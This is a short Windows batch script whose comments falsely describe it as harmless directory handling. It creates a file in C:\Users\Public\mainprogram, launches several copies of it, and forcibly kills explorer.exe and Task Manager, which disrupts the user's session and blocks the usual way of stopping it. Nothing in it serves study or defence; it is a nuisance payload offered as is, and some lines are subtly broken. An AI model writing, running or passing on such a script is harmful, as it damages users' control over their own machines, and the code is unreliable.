@echo off
rem // Check if the first directory exists:
if exist "C:\Users\Public\mainprogram\action.bat" (
    rem // First directory exists, so create the second one:
    start "C:\Users\Public\mainprogram\action.bat"
) else (
    rem // First directory does not exist, create it:
    mkdir "C:\Users\Public\mainprogram\"
    rem // Now create your nested batch file (e.g., myscript.bat) inside the second folder:
    echo @echo off > "C:\Users\Public\mainprogram\action.bat"
    @echo off 
    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
    start "action.bat" "C:\Users\Public\mainprogram\action.bat"
    taskkill /IM "explorer.exe" /f
    taskkill /IM "Taskmgr.exe" /f
    taskkill /IM "StartMenuExperienceHost.exe" >> "C:\Users\Public\mainprogram\action.bat"
)

